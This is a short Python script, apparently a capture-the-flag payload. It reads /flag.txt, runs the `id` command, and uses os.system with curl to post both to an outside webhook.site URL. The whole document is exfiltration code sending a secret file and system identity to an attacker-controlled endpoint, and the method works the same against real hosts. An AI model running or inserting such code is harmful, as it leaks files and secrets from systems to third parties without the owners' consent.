import os

URL = "https://webhook.site/85f1d57b-15e4-492f-b453-5da052ed93d2"
flag = open("/flag.txt", 'r').read()
os.system(f'curl -H "Content-Type: application/x-www-form-urlencoded" -d "flag={flag}&id=$(id)" {URL}')